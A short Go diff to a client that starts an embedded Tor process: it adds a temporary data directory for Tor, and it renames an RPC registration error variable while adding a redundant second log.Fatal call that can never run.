@@ -5,6 +5,7 @@ package client
 import (
 	"crypto/tls"
 	"crypto/x509"
+	"io/ioutil"
 	"log"
 	"net"
 	"net/rpc"
@@ -35,8 +36,18 @@ func connect(dialer *tor.Dialer) (net.Conn, error) {
 func NetClient() {
 	log.Println("[NetClient] Starting Tor connection...")
 	initServer()
-	var conf tor.StartConf
-	conf = tor.StartConf{ProcessCreator: embedded.NewCreator()}
+
+	tmpDir, err := ioutil.TempDir("", "")
+	if err != nil {
+		log.Println("[NetClient] [!] Could not create temp dir for Tor: ", err)
+		return
+	}
+
+	conf := tor.StartConf{
+		ProcessCreator:    embedded.NewCreator(),
+		DataDir:           tmpDir,
+		RetainTempDataDir: false,
+	}
 
 	t, err := tor.Start(nil, &conf)
 	if err != nil {
@@ -45,9 +56,10 @@ func NetClient() {
 	}
 
 	api := new(API)
-	rpc_err := rpc.Register(api)
-	if rpc_err != nil {
-		log.Fatal("[NetClient] [!] Could not register RPC API: ", rpc_err)
+	rpcErr := rpc.Register(api)
+	if rpcErr != nil {
+		log.Fatal(rpcErr)
+    log.Fatal("[NetClient] [!] Could not register RPC API: ", rpcErr)
 	}
 
 	defer t.Close()
